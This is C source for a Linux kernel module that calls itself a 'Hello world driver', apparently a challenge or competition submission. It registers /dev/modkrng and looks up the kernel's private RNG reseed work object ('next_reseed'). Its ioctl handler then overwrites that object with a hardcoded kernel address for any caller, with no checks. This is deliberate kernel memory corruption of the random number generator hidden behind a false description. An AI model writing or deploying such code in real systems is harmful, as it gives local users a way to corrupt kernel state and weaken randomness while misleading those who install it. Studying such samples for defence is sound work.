#include <linux/init.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/kallsyms.h>   
#include <linux/workqueue.h>  
#include <linux/atomic.h>

MODULE_AUTHOR("Anonymous Submission #60");
MODULE_DESCRIPTION("Hello world driver");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "modkrng"
#define DEVICE_FILE_NAME  "/dev/modkrng"
#define MAJOR_NUM 144

#define SUCCESS 0
#define FAILURE -1

static struct delayed_work *next_reseed;

static int device_open(struct inode *inode, struct file *file)
{
	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
	return SUCCESS;
}

static long device_ioctl(struct file *file, unsigned int ioctl_num,
		unsigned long ioctl_param)
{

	unsigned long *d = (unsigned long *)next_reseed;
	*d = 0xffff888100176805;

	return SUCCESS;
}

struct file_operations fops = {
	.unlocked_ioctl = device_ioctl,
	.open           = device_open,
	.release        = device_release,
};

static int __init custom_init(void) {
	printk(KERN_INFO "Initializing custom module");

	int rv;

	/* Register the character device */
	if ((rv = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops)) < 0) {
		pr_err("Registering character device failed with %d.\n", rv);
		return FAILURE;
	}

	printk(KERN_INFO "Character device registration success! Major device number = %d.\n",
			MAJOR_NUM);
	printk(KERN_INFO "Create a device file with:\n\tmknod %s c %d 0\n",
			DEVICE_FILE_NAME, MAJOR_NUM);

	next_reseed = (struct delayed_work *)kallsyms_lookup_name("next_reseed.6");

	if (next_reseed) {
		printk(KERN_INFO "next_reseed address: %px\n", next_reseed);
	} else {
		printk(KERN_WARNING "Failed to find symbol 'next_reseed'\n");
		return FAILURE;
	}

	printk(KERN_INFO "Module initialization complete!\n");

	return SUCCESS;
}

static void __exit custom_exit(void) {
	printk(KERN_INFO "Exiting custom module");

	printk(KERN_INFO "Cleaning up before exiting module...\n");

	unregister_chrdev(MAJOR_NUM, DEVICE_NAME);

	printk(KERN_INFO "Unregistered character device: %s.\n", DEVICE_FILE_NAME);

}

module_init(custom_init);
module_exit(custom_exit);
